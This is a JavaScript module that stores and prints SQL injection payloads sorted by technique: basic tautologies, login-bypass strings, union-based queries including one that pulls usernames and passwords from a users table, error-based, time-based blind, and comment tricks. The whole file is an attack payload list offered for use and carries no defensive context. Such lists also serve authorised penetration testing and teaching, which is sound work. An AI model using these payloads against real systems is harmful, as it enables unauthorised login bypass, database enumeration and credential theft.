const sqlInjections = {
    payloads:{
        basic:{
            name:'Basic',
            commands:[`' OR '1'='1`, `' OR 1=1--`, `" OR 1=1--`, `' OR 'a'='a`, `') OR ('1'='1`, `admin' -- `, `' OR 1=1#`]
        },
        loginBypass:{
            name:'Login Bypass',
            commands:[`' OR '1'='1' --`, `' OR 1=1 LIMIT 1; --`, `' OR '' = '`, `admin' -- `, `admin' #`, `admin'/*`]
        },
        unionBased:{
            name:'Union Based',
            commands:[`' UNION SELECT NULL, NULL--`, `' UNION SELECT 1, 'another column'--`, `' UNION SELECT username, password FROM users--`]
        },
        errorBased:{
            name:'Error Based',
            commands:[`' AND 1=CONVERT(int, (SELECT @@version))--`, `' AND 1=CAST((SELECT database()) AS INT)--`]
        },
        blind:{
            name:'Blind',
            commands:[`' OR IF(1=1, SLEEP(5), 0)--`, `' OR SLEEP(5)--`]
        },
        commentSyntax:{
            name: 'Comments',
            commands:[`' -- `, `' #`, `'/*`]
        }
    },
    utils:{
        print:function(groupToPrint){
            const printGroup = this.getGroup(groupToPrint)
            if(printGroup){  
                console.log(printGroup.name)  
                for (let i = 0; i < printGroup.commands.length; i++) {
                    console.log(printGroup.commands[i]);
                }
            }
            else{
                console.log('Error invalid selection')
            }
        },
        getGroup:function(groupName){  
            const group = sqlInjections.payloads && sqlInjections.payloads[groupName];
            if (group && Array.isArray(group.commands)){
                return group
            }
            else{
                return false
            }
        }
    }
}
module.exports = sqlInjections
